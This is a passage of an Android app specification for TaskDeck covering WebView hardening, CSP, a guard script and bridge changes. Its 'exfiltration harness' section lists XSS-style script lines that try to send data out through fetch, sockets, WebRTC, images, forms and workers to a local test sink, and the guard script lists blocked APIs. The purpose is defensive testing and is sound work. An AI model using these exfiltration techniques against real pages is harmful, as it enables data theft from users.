**S-20. Nothing else.** Every other part of the fork base stays as it is, among them: the 17 verbs and their JSON; Undo; the outbox and the snapshot, month and weather caches (now held only for the page load by S-04); the offline banner and "Don't warn"; the sheets; the views; the 60-second timers; `navigator.vibrate`, `confirm`, `showPicker`, `crypto.randomUUID`; the photo picker's `<input type="file">` and its `blob:` preview.

### 8.3 Changes in `android`

**A-01. The offline queue is removed.** The identifiers `OUTBOX_KEY`, `outbox`, `keepOutbox`, `waitingFor`, `queueEdit`, `flush`, `flushing`, `replay`, `discardAction`, `showPending`, `unqueue` and the `kept` arrow function (phone.html:4837) are absent. `send()` posts the verb at once; on success it behaves as today; on `410` as today (toast, clear the selection, close the sheet, reload); on every other error it shows `toast(error.message)` and returns `null`. Each Undo (phone.html:4876-4949) always sends its inverse command (the `unqueue` branches go). `load()` no longer flushes. Edits are durable in the device's outbox the moment `submit` returns (`device.md` §17.4), so nothing is kept in the page.
- Result: no edit is ever held in the page.

**A-02. The page caches are removed.** The identifiers `SNAP_KEY`, `SNAPS_KEPT`, `snapKeysOldestLast`, `remember`, `recall`, `MONTH_KEY`, `CACHE_MONTHS_BACK`, `CACHE_MONTHS_FORWARD`, `worthCaching`, `keepMonth`, `recallMonth`, `pruneMonths`, `keptSince`, `WEATHER_KEY`, `recallWeather`, `keepWeather` and `state.agenda.months` are absent. Call sites: `load()` paints no kept day before asking; `goTo()` paints no kept day; the boot paints no kept day; `absorb()` keeps no month; `seedAgenda()` keeps only its derivation of `agenda.first` and `agenda.last` from memory; `loadWeather` keeps no report. The core answers in milliseconds from the local replica, so the first frame waits only for `hello` and one `GET /api/state` (§16).
- Result: `store` holds only `taskdeck-mode`.

**A-03. The sync line.** `state.staleAt` is removed. `staleNote()` returns, always, `el('span', { class: 'syncline', text: ' · ' + syncText(state.sync, Date.now()) })`, where `state.sync` is the latest sync data (§5.4, A-08) and `syncText(sync, now)` is the first matching row of this table:

| # | Condition | Text |
|---|---|---|
| 1 | `mode` is `local` | `Not synced — this phone is not paired` |
| 2 | `mode` is `key_lost` | `Not synced — pair this phone again` |
| 3 | `halted` or `stopped` | `Sync stopped — open Devices` |
| 4 | `paused_until_ms > now` | `Sync paused until <time(paused_until_ms)>` |
| 5 | `session` is `live` and `last_synced_ms` is present | `Synced <time(last_synced_ms)>` |
| 6 | `last_synced_ms` is present | `Not synced since <time(last_synced_ms)>` |
| 7 | otherwise | `Not synced yet` |

followed, in this order, by ` · <queued> waiting` when `queued > 0`, ` · <doomed> will be refused` when `doomed > 0`, and ` · <banners> device change<s> to review` when `banners > 0` (`<s>` is `s` unless the count is 1). `time(ms)` is `toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' })` when `ms` falls on today's local date; else `toLocaleDateString(undefined, { weekday: 'short' })` + ' ' + that time when it is less than 6 × 86,400,000 ms before `now`; else `toLocaleDateString(undefined, { day: 'numeric', month: 'short' })`. Before the first `sync` data (in `hello`), the text is `Not synced yet`. `refreshStale()` redraws the line on every `sync` event and on the existing 60-second timer. The line has no control and nothing hides it: "Don't warn" is gone (A-05) and no setting touches it (V3-6; DOCUMENTATION.md:2817). The Tray sheet (`renderTraySheet`, phone.html:5208) gains, as its last element, `el('div', { class: 'section actions' }, [el('button', { text: 'Devices and sync', onclick: () => api('/api/screen', { method: 'POST', body: '{"name":"devices"}' }) })])`.
`syncText(sync, now)` stands alone between `/* td:syncText:begin */` and `/* td:syncText:end */`, using no other name of the page, so that CI runs it in Node 22 (with `TZ=UTC` and `LANG=en_GB.UTF-8`) against the vectors of §19.
- Result: the masthead always says how fresh the board is.

**A-04. Notices and refusals in the notice banner.** `NOTICE_KEY`, `state.notice` and `rememberNotice` are removed. On each `notices` event the page keeps `data.records`; `settleBanner()` shows, when there are records, one banner whose text joins the lines of the first three records with `' · '` and then, when there are more, `' · and <n> more'`, with one action `['OK', …]` that posts `POST /api/notice` for every record shown and then hides the banner. Lines, with `name(id)` the item's name in quotes from `state.items` (or `#<id>` when the item is not in the snapshot) and `dev(n)` the name in `data.devices` (or `device <n>`):

| Record | Line |
|---|---|
| refusal, `op` `set_notes`, `code` `core/notes_stale` | `Your notes were changed on another device first — open Notes to merge` |
| other refusal | `A change made here could not be applied: <describe({op, id: target})> — <reason(code)>` |
| notice `overwrite`, `author` = `self` | `This phone's change to <name(item)> replaced a change made on <dev(other)>` |
| notice `overwrite`, `other` = `self` | `Your change to <name(item)> was replaced by one from <dev(author)>` |
| notice `skipped`, reason `changed` | `Reflow left a block of <name(item)> alone: it was changed on <dev(other)>` |
| notice `skipped`, reason `gone` | `Reflow left a block of <name(item)> alone: it was gone` |
| any other notice | `A change to <name(item)> crossed one from <dev(author)>` |

`describe` is today's (phone.html:1504-1529). `reason(code)`: `core/gone` → `it was deleted on another device`; `core/kind` → `the item changed kind on another device`; `core/cap` → `the board is full`; `core/rules` → `this phone's TaskDeck is newer than the board allows`; `core/id_taken` → `a restored block clashed with another`; `engine/skipped` → `it was skipped by a repair`; `engine/reseal_limit` → `it could not be re-sent after a key change`; any other → `it was refused (<code>)`.
- Result: a refusal that arrives after the verb returned reaches the user (V3-6).

**A-05. The offline warning is removed.** `QUIET_KEY`, `state.quietOffline`, `setQuietOffline`, the "Don't warn" action and the Tray's `quietrow` (phone.html:5217-5222) are absent. `load()`'s `catch` branch becomes: `if (mine !== loadSeq || asked !== state.day) return; showBanner(error.message, { retry: true });`.
- Result: `store` maps no `quiet_offline` (§8.4).

**A-06. Notes with a base, and the conflict sheet.** `renderNotesSheet` (phone.html:4718-4732): when the sheet opens with `state.notesDraft == null`, the page sets `state.notesBase = state.snap.notes_base`; Save sends `{ op: 'set_notes', text: area.value, base: state.notesBase }` and on success clears `state.notesDraft` and `state.notesBase`. When the latest `notices` data holds a refusal with `code` `core/notes_stale`, opening Notes first asks `GET /api/notes_merge`; when `merge` is not `null`, the sheet shows, in this order: the heading `Notes changed elsewhere`, the line `Another device saved the notes after you started. Here are both; keep one, or edit and save.`, a read-only `<textarea>` with `merge.theirs` under the label `On the board`, an editable `<textarea>` with `merge.mine` under the label `This phone's version`, and the buttons `Save mine` (posts `POST /api/notes_resolve` with the editable text), `Keep the board's` (posts `POST /api/notes_discard`) and `Close`. After either post succeeds the page reloads (`load({ quiet: true })`) and closes the sheet.
- Result: a stale save neither duplicates nor loses text (SYNC.md §4.6, V3-6).

**A-07. "Will be refused" marks.** `waitingFor` (gone with A-01) is replaced in the item sheet (phone.html:5036-5039) by two lines from the latest `sync.pending` marks whose `target` is the item's id: with `q` the marks not `acknowledged` and without `doomed`, when `q > 0`, `<q> change<s> to this <is/are> not on the relay yet.`; and for each mark with `doomed`, `This change will be refused: <reason(doomed)>.` (A-04's `reason`). In `renderLanes` (phone.html:4222) the `entry` and `marker` elements, and in `dayNode` (phone.html:4059) the `arow` elements built from an entry, gain the class `doomed` when a mark with `doomed` targets that entry's `id`. The `<style>` gains `.doomed { opacity: 0.55; outline: 1px dashed currentColor; outline-offset: -2px; }`. When a `sync` event changes the set of targets with `doomed`, the page calls `render()` and, in the agenda, `patchAgenda(Array.from(state.agenda.onScreen))`.
- Result: an edit the device knows will be refused is marked where it shows (V3-6).

**A-08. The bridge's sync data.** `bridge.on('sync', …)` keeps the latest sync data in `state.sync` (first taken from `hello.sync`); `bridge.on('notices', …)` keeps the latest notices data and calls `settleBanner()`.
- Result: A-03, A-04 and A-07 read only data the bridge pushed.

**A-09. Nothing else.** Every part of the page not named by A-01 to A-08 stays as S-01 to S-20 left it.

### 8.4 Page preferences

The page's only persistent state is two preferences, kept by the shell in the `SharedPreferences` file `page_prefs` (app-private storage, excluded from backup and transfer, §12.3). Each value is at most 64 bytes.

| `store` key (the page's) | Preference key | Type | Values in `store` ↔ preference | Kept in |
|---|---|---|---|---|
| `taskdeck-mode` | `mode` | string | `'day'`, `'agenda'`, `'weather'` ↔ the same string | `android-shell` and `android` |
| `taskdeck-quiet-offline` | `quiet_offline` | boolean | `'yes'` ↔ `true`; absent ↔ absent | `android-shell` only; removed by A-05 |

The `td-prefs` block holds a JSON object with the members of the preferences that are set, e.g. `{"mode":"day"}`. `POST /api/prefs` takes `{"key": "<preference key>", "value": <value or null>}`; `null` removes it; any other key or a value outside the table is `400 bridge/bad_body` `{"error":"That is not a setting."}`.

Today's other storage, and where it goes:

| Today (digest §4) | In `android-shell` | In `android` |
|---|---|---|
| `taskdeck-token` | gone (S-05) | gone |
| `taskdeck-notice` | in `store` for the page load only | gone (A-04): the device keeps notices |
| `taskdeck-snap-<day>`, `taskdeck-month-<month>` | in `store` for the page load only | gone (A-02) |
| `taskdeck-outbox` | in `store` for the page load only | gone (A-01): the device's outbox |
| `taskdeck-weather` | in `store` for the page load only | gone (A-02): `weather.tdk` (`device.md` §6.4.12) |
| `taskdeck-weather-place`, `taskdeck-weather-desk` | gone (S-10): `own_place` in `device.tdk` | gone |
| `taskdeck-sky-warm` | gone (S-08) | gone |
| Cache Storage `taskdeck-photo-v1`, the service worker's `taskdeck-shell-v2` and `taskdeck-sky-v1` | gone (S-07, S-13) | gone |

The shell's own preferences file `shell` holds `own_place_at_ms` (§6.4.5) and `notifications_asked` (§12.2); nothing else.

- **BRIDGE-PREF-001** (android-shell) The shell MUST persist for the page only the preferences of §8.4's table for its stage, and MUST refuse any other key or value with `400 bridge/bad_body`.
- **BRIDGE-PREF-002** (android-shell) The page MUST persist nothing across page loads except through `POST /api/prefs`.

## 9. WebView settings and hardening

The page holds the whole board, so the WebView is built so that script inside it, even script an attacker got in (an XSS from a hostile feed, V1-9), gets the page's own verbs and no way out (SYNC.md §7, the WebView row).

### 9.1 The start-up check

Old emulator images carry a WebView that cannot be updated: version 58 at API 26 against 133 at API 36 (SYNC_PLAN.md §5). Real Android 8 phones update it from the Play Store. The app therefore checks, in `MainActivity.onCreate` and again in every `onStart`, before it creates a WebView:

1. `pkg = WebViewCompat.getCurrentWebViewPackage(context)`; `null` fails the check.
2. `major` = the leading decimal digits of `pkg.versionName`; none, or `major < 120`, fails the check.
3. `WebViewFeature.isFeatureSupported` is true for `WEB_MESSAGE_LISTENER` and `DOCUMENT_START_SCRIPT`; else the check fails.

On a failure the activity creates no WebView and shows a native layout: `TaskDeck needs a newer Android System WebView: version 120 or later. This phone has <pkg.versionName, or "none">.`, a button `Update` that starts `ACTION_VIEW` on `market://details?id=<pkg.packageName, or com.google.android.webview>` and, when no activity resolves it, on `https://play.google.com/store/apps/details?id=<the same>`, and a button `Devices and sync` that starts `DevicesActivity`. The core host still opens; jobs, reminders and the native screens keep working. The minimum 120 is decided here (§22): every feature §5 and §9 need is in it, and Android 8 phones that take Play Store updates have long had newer versions.

- **BRIDGE-WV-001** (android-shell) `MainActivity` MUST run the three checks of §9.1 before it creates a WebView, in `onCreate` and in every `onStart`, and MUST NOT create a WebView when one fails.
- **BRIDGE-WV-002** (android-shell) On a failed check the activity MUST show the update screen of §9.1, and an instrumented test on the API 26 emulator image (WebView 58) MUST prove that it does.

### 9.2 Settings

Applied to every WebView before its first `loadUrl`:

| Setting | Value |
|---|---|
| `settings.javaScriptEnabled` | `true` |
| `settings.domStorageEnabled` | `false` (SYNC.md §5.6: DOM storage off) |
| `settings.databaseEnabled` | `false` |
| `settings.allowFileAccess`, `settings.allowContentAccess` | `false` |
| `settings.allowFileAccessFromFileURLs`, `settings.allowUniversalAccessFromFileURLs` | `false` |
| `settings.blockNetworkLoads` | `true` |
| `settings.mixedContentMode` | `MIXED_CONTENT_NEVER_ALLOW` |
| `settings.setSupportMultipleWindows` | `false` |
| `settings.javaScriptCanOpenWindowsAutomatically` | `false` |
| `settings.setGeolocationEnabled` | `false` |
| `settings.cacheMode` | `LOAD_NO_CACHE` |
| `settings.mediaPlaybackRequiresUserGesture` | `true` |
| `settings.safeBrowsingEnabled` | `false`; and the manifest meta-data `android.webkit.WebView.EnableSafeBrowsing` = `false` (the only URL is the asset origin; no lookups go to Google) |
| manifest meta-data `android.webkit.WebView.MetricsOptOut` | `true` |
| `CookieManager.setAcceptCookie`, `setAcceptThirdPartyCookies(webView, …)` | `false` |
| `WebView.setWebContentsDebuggingEnabled` | `false`, except in debug builds of the `echo` flavour |
| `webView.setDownloadListener` | not set |
| `webView.isLongClickable` | unchanged (text selection in the sheets) |
| service workers, when `SERVICE_WORKER_BASIC_USAGE` is supported | `ServiceWorkerWebSettingsCompat`: `blockNetworkLoads = true`, `allowContentAccess = false`, `allowFileAccess = false`; a `ServiceWorkerClientCompat` whose `shouldInterceptRequest` answers every request with the 403 of §7.1 |

- **BRIDGE-WV-003** (android-shell) Every WebView MUST carry every setting of the table of §9.2 before its first `loadUrl`, and the release manifest MUST carry the two meta-data entries.
- **BRIDGE-WV-004** (android-shell) A release build MUST NOT enable WebView debugging.

### 9.3 The clients

| Callback | Answer |
|---|---|
| `WebViewClient.shouldInterceptRequest` | the asset handler (§7.1), never `null` |
| `WebViewClient.shouldOverrideUrlLoading` (both forms) | `true`: the WebView never navigates; the initial `loadUrl` of the page is made by the shell and is not asked about |
| `WebViewClient.onPageStarted` | ends the current page load (§5.6) |
| `WebViewClient.onReceivedSslError` | `handler.cancel()` |
| `WebViewClient.onReceivedHttpAuthRequest` | `handler.cancel()` |
| `WebViewClient.onReceivedClientCertRequest` | `request.cancel()` |
| `WebViewClient.onRenderProcessGone` | §9.7, returning `true` |
| `WebViewRenderProcessClient.onRenderProcessUnresponsive` (when `WEB_VIEW_RENDERER_CLIENT_BASIC_USAGE` is supported) | after 10,000 ms of being unresponsive, `renderProcess.terminate()` |
| `WebChromeClient.onCreateWindow` | `false` |
| `WebChromeClient.onShowFileChooser` | `android-shell`: `filePathCallback.onReceiveValue(null)` and `true`. `android`: the photo picker (§9.8) |
| `WebChromeClient.onGeolocationPermissionsShowPrompt` | `callback.invoke(origin, false, false)` |
| `WebChromeClient.onPermissionRequest` | `request.deny()` |
| `WebChromeClient.onConsoleMessage` | `true` (BRIDGE-GEN-005) |
| `WebChromeClient.onJsAlert`, `onJsConfirm`, `onJsPrompt` | not overridden: the platform's dialogs, for the page's `confirm` |

- **BRIDGE-WV-005** (android-shell) `shouldOverrideUrlLoading` MUST return `true` for every URL, and the WebView MUST never leave the page it was loaded with.
- **BRIDGE-WV-006** (android-shell) The WebView's clients MUST answer each callback of §9.3 exactly as its table states.

### 9.4 The Content-Security-Policy

```text
default-src 'none'; script-src 'sha256-<H>'; style-src 'unsafe-inline'; img-src 'self' blob:; font-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'; require-trusted-types-for 'script'; trusted-types taskdeck; frame-ancestors 'none'
```

- `<H>` is the standard base64 (with padding) of SHA-256 over the UTF-8 bytes of the page's inline script element's content, from the byte after `<script>` to the byte before `</script>`. The script hash replaces today's `'unsafe-inline'` (phone.rs:1214).
- `connect-src 'none'`: after the fork the page makes no request of its own; everything it asks goes over the bridge, which CSP does not govern, so "limited to natively answered origins" (SYNC.md §7) is the empty list.
- `img-src 'self' blob:`: the sky symbols and the picture from the asset origin, and the `blob:` preview of a picture the user is cropping (phone.html:4581). `data:` is dropped: the page uses none.
- `style-src 'unsafe-inline'` stays: the page sets styles through attributes and CSSOM (digest §8); every style that names a URL is still bounded by `img-src` and `font-src`.
- The header (§7.2) carries the policy whole; the page's `<meta>` (S-01) carries it without `frame-ancestors 'none'`.

The Gradle task `checkPageCsp`, run by every build, computes `<H>` from `android/page/index.html`, fails when the `<meta>` policy's hash differs, and writes the header policy into `BuildConfig.PAGE_CSP` from the same value.

- **BRIDGE-CSP-001** (android-shell) The page's answer MUST carry the policy of §9.4 as its `Content-Security-Policy` header, and the page's `<meta>` MUST carry the same policy without `frame-ancestors`, both with the hash of the page's inline script.
- **BRIDGE-CSP-002** (android-shell) The build MUST fail when the script hash in the page's `<meta>` policy is not the hash of its inline script.

### 9.5 The Trusted Types policy

The page creates exactly one policy, `taskdeck` (S-16), the only name `trusted-types` allows; a second `createPolicy` of any name throws. Its `createHTML` is `ttHtml(s)`:

1. `s` is not a string, or longer than 262,144 UTF-16 code units: return `''`.
2. Every `<` in `s` begins a tag of the form `<` or `</` followed by one of `b`, `i`, `svg`, `text`, `circle`, `line`, `polyline`, `rect` and then a space, `/` or `>`: else return `''`. These are the only elements the page's three `html` callers write (the weather readout, the chart, the legend; phone.html:3604, 3755, 3759-3761); their text is escaped with `xml()`.
3. `s` matches none of `/javascript:/i`, `/url\s*\(/i`, `/\bhref\b/i`, `/\bsrc\s*=/i`, `/xlink/i`, `/@import/i`, `/\son[a-z]+\s*=/i`: else return `''`.
4. Return `s`.

A rejected string leaves its element empty; nothing else fails.

- **BRIDGE-TT-001** (android-shell) The page's `taskdeck` policy MUST return its input unchanged only when all of §9.5 steps 1 to 3 pass, and `''` otherwise.

### 9.6 The document-start script

`WebViewCompat.addDocumentStartJavaScript(webView, PAGE_GUARD, setOf("https://appassets.androidplatform.net"))` registers, before the first `loadUrl`, the script `PAGE_GUARD` (source `android/page/guard.js`, packaged as the asset `page/guard.js`, read once at start-up; the asset handler never serves it). It runs in every frame of the asset origin before any of the frame's own script (V1-9). In order, it:

1. **Makes frames inert.** For each of `HTMLIFrameElement`, `HTMLFrameElement`, `HTMLObjectElement`, `HTMLEmbedElement` that exists: defines on its prototype the getters `contentWindow` and `contentDocument` as `() => null`, non-configurable; for `HTMLObjectElement` and `HTMLEmbedElement` also `getSVGDocument` as a non-writable function returning `null`.
2. **Refuses elements.** Replaces `Document.prototype.createElement` and `createElementNS` with non-writable, non-configurable functions that throw `new DOMException('Not allowed.', 'NotSupportedError')` when the lowercased local name is one of `iframe`, `frame`, `frameset`, `object`, `embed`, `portal`, `fencedframe`, `link`, `base`, and otherwise call the original.
3. **Removes elements.** Starts a `MutationObserver` on `document` (`childList: true, subtree: true`) that removes every added element that is, or contains, an element with a local name of step 2's list or a `meta` with an `http-equiv` attribute. The page itself contains none after S-01 (no `<link rel>` value is allowed: the empty list), so the observer never touches the page's own nodes.
4. **Removes channels.** For every own property name of `window` matching `/^(webkit|moz)?RTC/`, and for `fetch`, `XMLHttpRequest`, `WebSocket`, `WebSocketStream`, `WebTransport`, `EventSource`, `Worker`, `SharedWorker`, `ServiceWorker`, `ServiceWorkerContainer`, `PresentationRequest`, `caches`, `indexedDB`, `openDatabase` and `open`: `Object.defineProperty(window, name, { value: undefined, writable: false, configurable: false })` when the property is configurable, else (a non-configurable property) leaves it and records its name in `window.__tdGuardMissed` (an array the harness reads, §10; empty is the pass). For `sendBeacon`, `serviceWorker`, `geolocation`, `vibrate`, `share`, `canShare`, `clipboard`, `credentials`, `mediaDevices`, `bluetooth`, `usb`, `serial`, `hid`, `presentation` and `registerProtocolHandler` on `Navigator.prototype`: defines a getter returning `undefined`, non-configurable.
5. Leaves `window.TaskDeckBridge`, `crypto`, `trustedTypes`, `requestAnimationFrame`, `Image` and the DOM untouched.

The `echo` flavour's builds (`echoDebug`, `echoTiming`, §12.1, §16) register a second document-start script, `page/clock.js` (§16.4; source `android/app/src/echo/assets/page/clock.js`), after `PAGE_GUARD`; no `full` build carries it.

- **BRIDGE-DOC-001** (android-shell) The shell MUST register `PAGE_GUARD` with `addDocumentStartJavaScript` for the asset origin before the WebView's first `loadUrl`, and `PAGE_GUARD` MUST perform the five steps of §9.6.
- **BRIDGE-DOC-002** (android-shell) After `PAGE_GUARD` ran, every `RTC*` constructor MUST be absent from the page's realm, and creating an `iframe`, `frame`, `object`, `embed`, `portal`, `fencedframe`, `link` or `base` element MUST throw.

### 9.7 Renderer crashes

`onRenderProcessGone(view, detail)`: the shell ends the page load (§5.6), removes the WebView from its layout and calls `destroy()` on it, and returns `true` so that the app process lives on. Then:

- when this is the third gone renderer within 60,000 ms, it shows the native layout `The page stopped working three times in a minute. Close TaskDeck and open it again.` with the button `Try again`, which recreates the WebView;
- otherwise it creates a new WebView with §9.2 to §9.6 applied and loads the page again at once.

The core is not touched: it runs in the app process, and every write the page had made is durable (§5.6). The new page load boots from `hello` (§5.8).

- **BRIDGE-WV-007** (android-shell) `onRenderProcessGone` MUST return `true`, MUST destroy the gone WebView, and MUST recreate a fully configured WebView unless three renderers were gone within 60,000 ms.

### 9.8 The photo picker (`android`)

`onShowFileChooser` starts the system photo picker: `MediaStore.ACTION_PICK_IMAGES` (with `type` `image/*`) when `MediaStore.getPickImagesMaxLimit` exists (API 33, and earlier through the Google system update), else `Intent.ACTION_GET_CONTENT` with `type` `image/*` and `CATEGORY_OPENABLE`. No storage permission is asked for (R2 §6). The chosen `content:` URI is handed back through `filePathCallback.onReceiveValue(arrayOf(uri))` only when its `ContentResolver.getType` starts with `image/`; else `null`. The WebView reads the file into the page's `<input type="file">`, and the page draws it from a `blob:` URL as today (phone.html:4581): this decodes a file the user chose on their own phone, not bytes from another device. The cropped JPEG the page then posts is decoded again in Rust (§6.4.4).

- **BRIDGE-WV-008** (android) `onShowFileChooser` MUST offer only images through the system picker of §9.8, and MUST ask for no storage permission.

## 10. The exfiltration harness

The claim that script in the page has no way out holds only while this harness passes (SYNC.md "Rejected or modified", V1-9). It is an instrumented test of `android-shell` (`android/app/src/androidTest/…/ExfiltrationTest.kt`), run in CI on the API 36 emulator image (a WebView of version 120 or later, §9.1), against the `echo` flavour, and again by `android` against the `full` flavour (its gate: "the exfiltration harness still empty", SYNC_PLAN.md §6.10).

### 10.1 The sink

Before the page loads, the test opens, inside the app's test process:

- a TCP listener on `127.0.0.1:47811` that accepts every connection and records it (time, first 4,096 bytes);
- a UDP socket on `127.0.0.1:47812` that records every datagram (STUN, DNS-like probes);
- a TCP listener on `127.0.0.1:47813` speaking TLS with a self-signed certificate (for `https:` and `wss:` attempts), recording every accepted connection.

Every attempt below targets these addresses by IP literal, so no DNS lookup is needed to observe it. A pass needs the sink to record nothing: zero accepted connections and zero datagrams.

### 10.2 The attempts

The test waits for the page's `first_day` mark, then runs each attempt with `WebView.evaluateJavascript`, which executes in the page's main realm as an XSS would, and is not bound by the page's CSP `script-src`. `S` is `http://127.0.0.1:47811`, `T` is `https://127.0.0.1:47813`, `U` is `127.0.0.1:47812`.

| # | Channel | Script (each wrapped in `try { … } catch (e) {}`) |
|---|---|---|
| 1 | fetch | `fetch(S + '/1')`; `fetch(T + '/1')`; `window.fetch` read from `Object.getPrototypeOf(window)` and called |
| 2 | XHR | `const x = new XMLHttpRequest(); x.open('GET', S + '/2'); x.send()` |
| 3 | sockets | `new WebSocket('ws://127.0.0.1:47811/3')`; `new WebSocket('wss://127.0.0.1:47813/3')`; `new WebTransport(T + '/3')`; `new EventSource(S + '/3')` |
| 4 | WebRTC, main realm | `new RTCPeerConnection({iceServers: [{urls: 'stun:' + U}, {urls: 'turn:' + U, username: 'u', credential: 'c'}]})`, then `createDataChannel('x')`, `createOffer()`, `setLocalDescription`; the same with `webkitRTCPeerConnection` |
| 5 | WebRTC, fresh realm | create an `iframe` by `document.createElement('iframe')`, by `document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe')`, by `Range.createContextualFragment('<iframe></iframe>')`, by `new DOMParser().parseFromString('<iframe></iframe>', 'text/html')` with the node adopted, and by `div.innerHTML = '<iframe></iframe>'`; for each that yields an element, append it and read `contentWindow.RTCPeerConnection`, then run attempt 4 with it |
| 6 | images | `new Image().src = S + '/6'`; an `<img>` with `src` and with `srcset` to `S`; `<picture><source srcset>`; an SVG `<image href>` |
| 7 | styles | `document.body.style.backgroundImage = 'url(' + S + '/7)'`; a `<style>` with `@import url(S/7i)`, `@font-face { src: url(S/7f) }` and `background: url(S/7b)`; `document.adoptedStyleSheets` with `@import`; `CSS.registerProperty` with a URL |
| 8 | forms | a `<form action=S method=post>` submitted by `submit()` and `requestSubmit()`; a `<button formaction=S>` clicked |
| 9 | navigation | `location.href = S + '/9'`; `location.assign`, `location.replace`; an `<a href=S>` clicked; `<a href=S target=_blank>` clicked; a `<meta http-equiv="refresh" content="0;url=S/9">` appended; `history.pushState(null, '', S + '/9p')`; `document.write('<a href=S>')` |
| 10 | frames | `iframe`, `frame`, `object data=S`, `embed src=S`, `portal src=S`, `fencedframe` with a config |
| 11 | beacons and pings | `navigator.sendBeacon(S + '/11')`; `<a ping=S href="#">` clicked |
| 12 | link hints | `<link rel>` with each of `prefetch`, `preconnect`, `dns-prefetch`, `preload`, `modulepreload`, `prerender`, `stylesheet`, `icon`, `manifest` to `S`, by `createElement`, by `innerHTML` and by `insertAdjacentHTML`; a `Link:` header is not reachable from script |
| 13 | service worker | `navigator.serviceWorker.register('/sw.js')`; with a `blob:` URL; read from a fresh realm (attempt 5) |
| 14 | windows | `window.open(S + '/14')`; `open` read from `Window.prototype` |
| 15 | workers | `new Worker(URL.createObjectURL(new Blob(['fetch("' + S + '/15")'])))`; `new SharedWorker(…)`; `import(S + '/15.js')`; a `<script src=S>` appended |
| 16 | media | `new Audio(S + '/16').play()`; `<video src=S>`; `<track src=S>` |
| 17 | other APIs | `navigator.share({url: S})`; `navigator.clipboard.writeText('x')`; `navigator.geolocation.getCurrentPosition`; `new PresentationRequest(S)`; `navigator.credentials.get()`; `Notification.requestPermission()` |
| 18 | the bridge | for each verb and route of §6.6, a `req` envelope posted on `TaskDeckBridge` |

### 10.3 Pass

The harness passes when, 10,000 ms after the last attempt:

1. the sink has recorded nothing;
2. `window.__tdGuardMissed` is an empty array (§9.6 step 4);
3. every attempt of row 18 got the refusal §6.6 names;
4. the asset handler saw no request for an origin other than the asset origin that it answered other than with the 403 of §7.1 (it records each);
5. the WebView is still on the page (`webView.url` is `https://appassets.androidplatform.net/index.html`);
6. no activity other than `MainActivity` was started.

- **BRIDGE-HARN-001** (android-shell) The exfiltration harness MUST run every attempt of §10.2 against the sink of §10.1 on the API 36 emulator in CI, and MUST fail unless all six conditions of §10.3 hold.
- **BRIDGE-HARN-002** (android) The harness MUST pass against the `full` flavour with a paired board on the device.

### 10.4 When a channel cannot be closed

If an attempt reaches the sink and no change to the page, the CSP, `PAGE_GUARD` or the settings of §9.2 closes it, `android-shell` records the channel in its status file and the stage cannot exit: the fallback is SYNC.md's two-app split (V1-9, "Rejected or modified"): a UI app holding the WebView, the page and the core, without the `INTERNET` permission, and a network app signed with the same key, holding `INTERNET` and moving only relay, ICS and Open-Meteo bytes for the UI app over a bound service protected by a `signature` permission. Adopting it changes this spec, `device.md` (transport) and the release (two APKs), so it is made by a spec-change pull request (README §1), not inside `android-shell`.

## 11. The JNI surface

### 11.1 Library and loading

`crates/taskdeck-android` builds a `cdylib` named `taskdeck` (`libtaskdeck.so`) with `jni` 0.22.4. Features: `backend-echo` (`android-shell`; no `taskdeck-device`) and `backend-device` (`android`; links `taskdeck-device` with its default features, and so `taskdeck-core`, `taskdeck-seal`, `taskdeck-sync`, `taskdeck-backup`; no code of the root package, V3-17), with `default = ["backend-device"]` (ruling S32). A build has exactly one of them: building with both or with neither is a `compile_error!`. The Gradle `echo` flavour builds with `--no-default-features --features backend-echo`; the `full` flavour builds with the default features, and so with `backend-device`. A build that passes no feature arguments (a workspace-wide cargo command, `cargo test -p taskdeck-android`) gets `backend-device`, never `backend-echo`.

- **BRIDGE-GEN-011** (android-shell) `crates/taskdeck-android` MUST declare `default = ["backend-device"]` and MUST fail to compile with both `backend-echo` and `backend-device` or with neither; the `echo` flavour MUST build it with `--no-default-features --features backend-echo`, and the `full` flavour MUST build it with the default features and MUST NOT pass `--no-default-features`.

`TaskDeckApp.onCreate` calls `System.loadLibrary("taskdeck")` (BRIDGE-PROC-002). `JNI_OnLoad` stores the `JavaVM`, finds the class `app/taskdeck/phone/KeyVault` and its three static methods (§11.5) and keeps a `GlobalRef` to the class and the method ids: a thread the Rust runtime started cannot find an app class by name later, because it has no app class loader.

All entry points are static methods of the Kotlin `object app.taskdeck.phone.Native`, declared `@JvmStatic external fun`, so their symbols are `Java_app_taskdeck_phone_Native_<name>`.

### 11.2 Entry points

Strings in, strings out (SYNC_PLAN.md §6.6), except `initPlatform` (it needs the Android `Context`) and `callSecret` (BRIDGE-GEN-007). Every result string is one JSON text.

| Function | Parameters | Result | Called from | Blocks |
|---|---|---|---|---|
| `initPlatform(context: Context): String` | the application context | `{"ok": true}`, or `{"ok": false, "code": …}` | `lifecycle`, once per process | short: initialises the platform verifier's Android part with the `JNIEnv` and the context (`full`); nothing in `echo` |
| `open(config: String): String` | §11.3 | §11.3 | `lifecycle` | long: `Device::open` (`device.md` §17.2) |
| `close(): String` | — | `{"ok": true}` or an error | tests only | long: `shutdown` (≤ 10,000 ms) |
| `request(envelope: String): String` | a `req` envelope (§5.2) | `{"status": int, "body": <JSON>}` (body absent when none) | `bridge-io`, `bridge-slow` | §6 |
| `call(name: String, args: String): String` | a name of §11.4 and its JSON arguments | `{"ok": true, "value": <JSON>}` or `{"ok": false, "code": string, "message": string}` | the native screens' worker, jobs, receivers, `lifecycle`, `bridge-slow` (`set_weather_place` only) | per row of §11.4 |
| `callSecret(name: String, args: String, secret: ByteArray): String` | `join` or `re_pair`, its arguments, the typed code as UTF-8 bytes | as `call` | the Pair screen's worker | short |
| `changes(): String` | — | the counters of `device.md` §17.3 as `{"any": int, "view": int, …}` with every field | any thread, the main thread included | read: never waits |
| `waitForChange(sinceAny: Long, timeoutMs: Int): String` | `timeoutMs` 1 to 60,000 | as `changes` | `watcher` | long: until `any > sinceAny` or the timeout |
| `picture(id: String): String` | a 16-character id | the base64 of the `look` bytes, or `""` | the WebView's request thread | read |

